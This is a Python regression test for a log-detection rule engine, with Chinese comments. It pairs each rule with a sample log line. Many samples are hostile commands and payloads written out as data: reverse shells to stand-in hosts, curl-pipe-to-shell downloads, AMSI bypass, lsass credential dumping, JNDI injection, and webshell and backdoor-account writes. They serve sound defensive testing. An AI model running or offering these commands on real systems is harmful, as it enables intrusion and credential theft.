"""规则样本回归：每条 row 规则都必须被自身样本命中，避免正则写错导致规则永远不触发。"""
from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from services.rule_engine import RuleStore, matches, aggregate_window_count, aggregate_fail_then_success  # noqa: E402

# 聚合规则无法用单行样本验证，由后端 frequency / 基线查询负责，单独列在这里
AGGREGATE_RULES = {
    "ws_size_shift", "scan_ip_burst", "auth_bruteforce",
    "web_404_burst", "web_login_failure_burst", "auth_password_spray", "win_password_spray",
    "fw_port_scan", "fw_host_scan", "auth_fail_then_success", "win_fail_then_success",
}

SAMPLES: dict[str, dict] = {
    # ---- 原有 Web 规则 ----
    "ws_access": {"path": "/index.php"},
    "ws_tiny_response": {"path": "/x.php", "status": 200, "bytes": 100},
    "scan_ua_known": {"ua": "sqlmap/1.7.2#stable"},
    "scan_ua_anomaly": {"ua": "-"},
    "inj_sql": {"raw": "GET /a?id=1 union select 1,2,3"},
    "inj_cmd": {"raw": "GET /a?ip=1.1.1.1; cat /etc/passwd"},
    "inj_file_include": {"raw": "GET /a?f=php://input"},
    "traversal": {"raw": "GET /a?f=../../etc/passwd"},
    "sensitive_file": {"path": "/.git/config"},
    "admin_probe": {"path": "/admin/login"},
    # ---- Web 攻击手法 ----
    "web_sensitive_hit": {"path": "/.git/config", "status": 200},
    "web_backup_download": {"path": "/backup/www.zip", "status": 200},
    "web_cmd_param": {"path": "/upload/shell.php?cmd=id"},
    "web_eval_param": {"path": "/1.php?x=eval($_POST[1])"},
    "web_include_system_file": {"path": "/index.php?file=../../etc/passwd"},
    "web_deserial": {"path": "/login", "ref": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA"},
    "web_jndi": {"ua": "${jndi:ldap://45.33.32.156:1389/a}"},
    "web_ognl": {"path": "/index.action?redirect:${%23a%3d1}"},
    "web_ssrf": {"path": "/proxy?url=http://127.0.0.1:6379/"},
    "web_api_expose": {"path": "/actuator/env"},
    "web_upload_exec": {"path": "/upload/2026/11/shell.php", "status": 200},
    "web_shell_name": {"path": "/cmd.php"},
    "web_method_odd": {"method": "TRACE"},
    "web_big_download": {"status": 200, "bytes": 20971520},
    "web_null_byte": {"path": "/index.php?id=1%00.jpg"},
    "web_tool_ua": {"ua": "python-requests/2.31.0"},
    "web_upload_post": {"method": "POST", "path": "/upload/file", "status": 200},
    # ---- Windows 登录与账号 ----
    "win_logon_failed": {"eventId": 4625},
    "win_logon_external": {"eventId": 4624, "srcip": "103.91.208.11"},
    "win_explicit_cred": {"eventId": 4648},
    "win_priv_logon": {"eventId": 4672},
    "win_susp_process": {"eventId": 4688, "cmdline": "powershell.exe -enc SQBFAFgA"},
    "win_new_account": {"eventId": 4720},
    "win_add_admin": {"eventId": 4732},
    "win_account_enabled": {"eventId": 4722},
    "win_password_reset": {"eventId": 4724},
    "win_account_deleted": {"eventId": 4726},
    "win_log_cleared": {"eventId": 1102},
    "win_audit_policy_change": {"eventId": 4719},
    "win_service_install": {"eventId": 7045},
    "win_log_service_stop": {"eventId": 6006},
    "win_rdp_logon": {"eventId": 4624, "logonType": "10"},
    "win_account_locked": {"eventId": 4740},
    "win_kerberoast": {"eventId": 4769, "msg": "Ticket Encryption Type: 0x17"},
    "win_time_change": {"eventId": 4616},
    "win_scheduled_task": {"eventId": 4698},
    "win_share_access": {"eventId": 5145},
    # ---- Sysmon ----
    "sm_web_child": {"eventId": 1, "parent": "w3wp.exe", "image": "cmd.exe"},
    "sm_office_child": {"eventId": 1, "parent": "winword.exe", "image": "powershell.exe"},
    "sm_shell_image": {"eventId": 1, "image": "powershell.exe"},
    "sm_encoded_cmd": {"eventId": 1, "cmdline": "powershell.exe -enc SQBFAFgA"},
    "sm_download_exec": {"eventId": 1, "cmdline": "certutil.exe -urlcache -f http://x/a.exe a.exe"},
    "sm_drop_executable": {"eventId": 11, "target": "C:\\Windows\\Temp\\a.exe"},
    "sm_run_key": {"eventId": 13, "target": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\evil"},
    "sm_service_reg": {"eventId": 13, "target": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\evil\\ImagePath"},
    "sm_outbound_script": {"eventId": 3, "image": "powershell.exe"},
    "sm_dns_susp_tld": {"eventId": 22, "target": "c2.xyz"},
    "sm_lsass_access": {"eventId": 10, "target": "C:\\Windows\\system32\\lsass.exe"},
    "sm_inject": {"eventId": 8},
    "sm_shadow_delete": {"eventId": 1, "cmdline": "vssadmin delete shadows /all /quiet"},
    "sm_defender_disable": {"eventId": 1, "cmdline": "Add-MpPreference -ExclusionPath C:\\"},
    "sm_cred_dump": {"eventId": 1, "cmdline": "procdump.exe -ma lsass.exe out.dmp"},
    "sm_lateral_tool": {"eventId": 1, "cmdline": "psexec \\\\10.0.0.5 -s cmd.exe"},
    "sm_schtasks_create": {"eventId": 1, "cmdline": "schtasks /create /tn x /tr y /sc onlogon"},
    "sm_wmi_persist": {"eventId": 19},
    "sm_file_time_change": {"eventId": 2},
    "sm_ads_create": {"eventId": 15},
    # ---- PowerShell ----
    "ps_encoded": {"text": "$b=[Convert]::FromBase64String($p); iex $b"},
    "ps_download_cradle": {"text": "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')"},
    "ps_hidden_window": {"text": "powershell.exe -w hidden -nop -ep bypass"},
    "ps_amsi_bypass": {"text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"},
    "ps_credential_access": {"text": "ConvertTo-SecureString $p -AsPlainText -Force"},
    "ps_reverse_shell": {"text": "$c=New-Object System.Net.Sockets.TCPClient('1.1.1.1',4444)"},
    "ps_token_manipulation": {"text": "OpenProcessToken($h,0x28,[ref]$t)"},
    "ps_iex_invoke": {"text": "IEX ($payload)"},
    # ---- Linux ----
    "lx_reverse_shell": {"raw": "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"},
    "lx_download_exec": {"raw": "curl -s http://x/a.sh | bash"},
    "lx_ssh_key_backdoor": {"raw": "echo ssh-rsa AAAAB3NzaC1yc2E >> /root/.ssh/authorized_keys"},
    "lx_mining": {"raw": "./xmrig -o stratum+tcp://pool.example:3333 -u x"},
    "lx_kernel_module": {"raw": "insmod /tmp/rk.ko"},
    "lx_disable_security": {"raw": "setenforce 0"},
    "lx_history_clear": {"raw": "history -c"},
    "lx_sudo_root": {"raw": "sudo: ops : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash"},
    "lx_su_root": {"raw": "su: session opened for user root by ops(uid=1000)"},
    "lx_chattr": {"raw": "chattr +i /var/www/html/shell.php"},
    "lx_passwd_write": {"raw": "echo 'hack::0:0::/:/bin/sh' >> /etc/passwd"},
    "lx_payload_tmp": {"raw": "wget http://x/a -O /tmp/a"},
    "lx_proc_masquerade": {"raw": "[kworker/0:1] -c stratum+tcp://x"},
    "lx_audit_exec_tmp": {"exe": "/tmp/.x/a"},
    "lx_audit_rule_flush": {"raw": "auditctl -D"},
    "lx_redis_unauth": {"raw": "redis-cli -h 10.0.0.5 config set dir /var/www/html"},
    "lx_db_client_root": {"raw": "mysql -u root -p123456"},
    "lx_container_privileged": {"raw": "docker run --privileged -v /:/host alpine"},
    # ---- 数据库与应用 ----
    "db_sql_syntax_error": {"raw": "ERROR 1064 (42000): You have an error in your SQL syntax"},
    "db_access_denied": {"raw": "Access denied for user 'root'@'10.0.0.5'"},
    "db_udf_privilege": {"raw": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'"},
    "db_redis_config": {"raw": "CONFIG SET dir /var/www/html"},
    "db_injection_in_slowlog": {"raw": "SELECT * FROM t WHERE id=1 UNION SELECT 1,2,3"},
    "app_deserial_exception": {"raw": "java.lang.ClassNotFoundException: ysoserial"},
    "app_jndi_lookup": {"raw": "javax.naming.InitialContext.lookup(ldap://evil/x)"},
    "app_ognl_error": {"raw": "com.opensymphony.xwork2.ognl.OgnlException: x"},
    "app_xxe_error": {"raw": "org.xml.sax.SAXParseException; DOCTYPE is disallowed"},
    "ct_k8s_exec": {"raw": "kubectl exec -it web-0 -- /bin/sh"},
    "ct_k8s_secret_access": {"raw": "kubectl get secrets db -o yaml"},
    "ct_docker_sock": {"raw": "docker run -v /var/run/docker.sock:/var/run/docker.sock x"},
    # ---- 防火墙 ----
    "fw_management_allowed": {"action": "accept", "dstport": 22},
    "fw_mgmt_from_public": {"action": "accept", "dstport": 3389, "srcip": "103.91.208.11"},
    "fw_deny_admin_scan": {"action": "deny", "dstport": 445},
    "fw_outbound_c2_port": {"action": "accept", "dstport": 4444},
    "fw_policy_any_any": {"raw": "permit ip any any"},
    "fw_config_cleared": {"raw": "clear config"},
    "fw_policy_changed": {"raw": "policy add rule trust-untrust"},
    "fw_admin_auth_failed": {"raw": "admin login failed from 10.0.0.5"},
    # ---- 原有主机规则 ----
    "backdoor_account": {"raw": "useradd -o -u 0 -g root hack"},
    "log_clear": {"raw": "wevtutil cl Security"},
    "persistence_cron": {"raw": "crontab -e"},
    # ---- Web 绕过与注入 ----
    "web_jndi_obfuscated": {"ua": "${${lower:j}ndi:ldap://evil/a}"},
    "web_xss_probe": {"path": "/search?q=%3Cscript%3Ealert(1)%3C/script%3E"},
    "web_ssti_probe": {"path": "/view?name={{7*7}}"},
    "web_xxe_probe": {"path": "/xml?x=%3C!DOCTYPE%20x%20[%3C!ENTITY%20x%20SYSTEM%20%22file:///etc/passwd%22%3E]"},
    "web_double_extension": {"path": "/upload/shell.php.jpg", "status": 200},
    "web_graphql_introspection": {"path": "/graphql?query={__schema{types{name}}}"},
    "web_encoded_traversal": {"path": "/read?f=%2e%2e%2fetc/passwd"},
    "web_gateway_route_change": {"method": "POST", "path": "/actuator/gateway/routes/evil"},
    # ---- Windows 滥用与持久化 ----
    "win_remote_service_unc": {"eventId": 7045, "msg": "Service File Name: \\\\10.0.0.5\\share\\svc.exe"},
    "win_bitsadmin_transfer": {"eventId": 4688, "cmdline": "bitsadmin /transfer x http://evil/a.exe C:\\Temp\\a.exe"},
    "win_mshta_remote": {"eventId": 1, "cmdline": "mshta.exe http://evil/a.hta"},
    "win_regsvr32_remote": {"eventId": 1, "cmdline": "regsvr32.exe /s /i:http://evil/a.sct scrobj.dll"},
    "win_rundll32_script": {"eventId": 1, "cmdline": "rundll32.exe javascript:alert(1)"},
    "win_wmi_remote_create": {"eventId": 4688, "cmdline": "wmic /node:10.0.0.5 process call create cmd.exe"},
    "win_privilege_assign": {"eventId": 4704},
    "win_directory_service_change": {"eventId": 5136},
    "win_kerberos_rc4": {"eventId": 4768, "msg": "Ticket Encryption Type: 0x17"},
    "sm_startup_folder_drop": {"eventId": 11, "target": "C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk"},
    "sm_dotnet_compile": {"eventId": 1, "cmdline": "csc.exe /out:C:\\Users\\Public\\a.exe C:\\Users\\Public\\a.cs"},
    "sm_defender_registry": {"eventId": 13, "target": "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\DisableAntiSpyware"},
    # ---- Windows 驱动与系统通道 ----
    "win_wmi_permanent_subscription": {"eventId": 5861, "channel": "Microsoft-Windows-WMI-Activity/Operational",
                                       "Consumer": "CommandLineEventConsumer.Name=\"Updater\"",
                                       "Query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData'"},
    "win_unsigned_driver": {"eventId": 3033, "channel": "Microsoft-Windows-CodeIntegrity/Operational",
                            "msg": "Code Integrity determined that a process attempted to load unsigned driver \\Device\\HarddiskVolume3\\temp\\evil.sys"},
    "win_firewall_rule_added": {"eventId": 2097, "channel": "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
                                "msg": "添加防火墙规则 · 允许 4444 入站", "RuleName": "允许 4444 入站"},
    "win_smb_auth_fail": {"eventId": 551, "channel": "Microsoft-Windows-SMBServer/Security",
                          "ClientAddress": "0200E5CBC0A8A6940000000000000000", "Status": "0xc000006d"},
    # ---- Linux 持久化与反取证 ----
    "lx_systemd_service_persist": {"raw": "systemctl enable evil.service"},
    "lx_shell_rc_persist": {"raw": "echo 'curl http://x/a|bash' >> ~/.bashrc"},
    "lx_at_persist": {"raw": "echo /tmp/a | at now + 1 minute"},
    "lx_ld_preload_exec": {"raw": "LD_PRELOAD=/tmp/evil.so id"},
    "lx_shadow_access": {"raw": "cat /etc/shadow"},
    "lx_base64_decode_exec": {"raw": "echo Y3VybCB4 | base64 -d | bash"},
    "lx_dev_shm_exec": {"raw": "chmod +x /dev/shm/.a && /dev/shm/.a"},
    "lx_cron_download": {"raw": "echo '* * * * * curl http://x/a|sh' | crontab -"},
    # ---- 数据库提权与落地 ----
    "db_outfile_write": {"raw": "SELECT '<?php eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/x.php'"},
    "db_mssql_cmdshell_enable": {"raw": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"},
    "db_postgres_program": {"raw": "COPY t FROM PROGRAM 'curl http://evil/a|sh'"},
    "db_redis_ssh_persist": {"raw": "CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys"},
    "db_mongo_server_js": {"raw": "db.users.find({$where: 'function(){return true}'})"},
}

# 正常业务样本，不应命中任何高危规则（用于确认正则不过宽）
NEGATIVES = [
    {"path": "/index.html", "status": 200, "bytes": 8432, "method": "GET", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
    {"path": "/static/app.js", "status": 200, "bytes": 120034, "method": "GET", "ua": "Mozilla/5.0"},
    {"path": "/api/user/list", "status": 200, "bytes": 2048, "method": "GET", "ua": "Mozilla/5.0"},
    {"path": "/upload/avatar.png", "method": "GET", "status": 200, "bytes": 33221},
    {"eventId": 4688, "cmdline": "powershell.exe -File C:\\Scripts\\Backup.ps1", "msg": "常规备份脚本"},
    {"eventId": 1, "cmdline": "mshta.exe C:\\Program Files\\Trusted\\app.hta", "target": "C:\\Program Files\\Trusted\\app.hta"},
    {"eventId": 7045, "msg": "Service File Name: C:\\Program Files\\Vendor\\svc.exe"},
    {"raw": "systemctl enable nginx"},
]


class RuleSampleTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = {r["id"]: r for r in RuleStore().load()}

    def test_every_rule_has_sample(self):
        missing = sorted(rid for rid in self.rules if rid not in SAMPLES and rid not in AGGREGATE_RULES)
        self.assertEqual(missing, [], "以下规则缺少命中样本：%s" % missing)

    def test_row_rules_hit_their_sample(self):
        failures = []
        for rid, rule in self.rules.items():
            if rule.get("kind") != "row" or rid not in SAMPLES:
                continue
            if not matches(rule, SAMPLES[rid]):
                failures.append(rid)
        self.assertEqual(failures, [], "样本未命中：%s" % failures)

    def test_aggregate_rules_are_marked(self):
        aggregate = {rid for rid, r in self.rules.items() if r.get("kind") == "aggregate"}
        self.assertEqual(aggregate, AGGREGATE_RULES, "聚合规则清单与测试不一致")

    def test_any_does_not_bypass_sibling_fields(self):
        rule = self.rules["win_mshta_remote"]
        sample = {"eventId": 999, "cmdline": "mshta.exe http://evil/a.hta"}
        self.assertFalse(matches(rule, sample), "any 分支不应绕过 eventId 限制")
        sample["eventId"] = 1
        self.assertTrue(matches(rule, sample))

    def test_negatives_do_not_hit_high_rules(self):
        hits = []
        for rule in self.rules.values():
            if rule.get("kind") != "row" or rule.get("severity") != "high" or not rule.get("enabled", True):
                continue
            for sample in NEGATIVES:
                if matches(rule, sample):
                    hits.append((rule["id"], sample.get("path")))
        self.assertEqual(hits, [], "正常请求被高危规则误命中：%s" % hits)


class CorrelationRuleTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = {r["id"]: r for r in RuleStore().load()}

    def test_window_count_uses_distinct_values(self):
        rule = self.rules["web_404_burst"]
        rows = [
            {"ts": 1000000 + i * 1000, "ip": "203.0.113.9", "status": 404, "path": "/dir/%d" % (i % 25)}
            for i in range(30)
        ]
        rows += [{"ts": 1000000 + i * 1000, "ip": "203.0.113.10", "status": 404, "path": "/only"} for i in range(40)]
        hits = aggregate_window_count(rows, rule)
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["ip"], "203.0.113.9")
        self.assertEqual(hits[0]["count"], 30)
        self.assertEqual(hits[0]["distinct_count"], 25)

    def test_password_spray_needs_multiple_accounts(self):
        rule = self.rules["win_password_spray"]
        rows = [
            {"ts": 2000000 + i * 1000, "srcip": "198.51.100.8", "eventId": 4625, "user": "user%d" % i}
            for i in range(8)
        ]
        rows += [
            {"ts": 2008000, "srcip": "198.51.100.8", "eventId": 4625, "user": "user0"},
            {"ts": 2009000, "srcip": "198.51.100.8", "eventId": 4625, "user": "user1"},
            {"ts": 2010000, "srcip": "198.51.100.9", "eventId": 4625, "user": "same"},
        ]
        hits = aggregate_window_count(rows, rule)
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["distinct_count"], 8)

    def test_failure_then_success_sequence(self):
        rule = self.rules["win_fail_then_success"]
        base = 3000000
        rows = [
            {"ts": base + i * 1000, "srcip": "198.51.100.20", "eventId": 4625, "user": "admin"}
            for i in range(5)
        ]
        rows.append({"ts": base + 10000, "srcip": "198.51.100.20", "eventId": 4624, "user": "admin"})
        rows.append({"ts": base + 11000, "srcip": "198.51.100.30", "eventId": 4624, "user": "normal"})
        hits = aggregate_fail_then_success(rows, rule)
        self.assertEqual(len(hits), 1)
        self.assertEqual(hits[0]["eventId"], 4624)
        self.assertEqual(hits[0]["failure_count"], 5)

    def test_sequence_rejects_success_outside_window(self):
        rule = self.rules["auth_fail_then_success"]
        base = 4000000
        rows = [
            {"ts": base + i * 1000, "srcip": "203.0.113.50", "result": "失败", "user": "root"}
            for i in range(5)
        ]
        rows.append({"ts": base + 601001, "srcip": "203.0.113.50", "result": "成功", "user": "root"})
        self.assertEqual(aggregate_fail_then_success(rows, rule), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
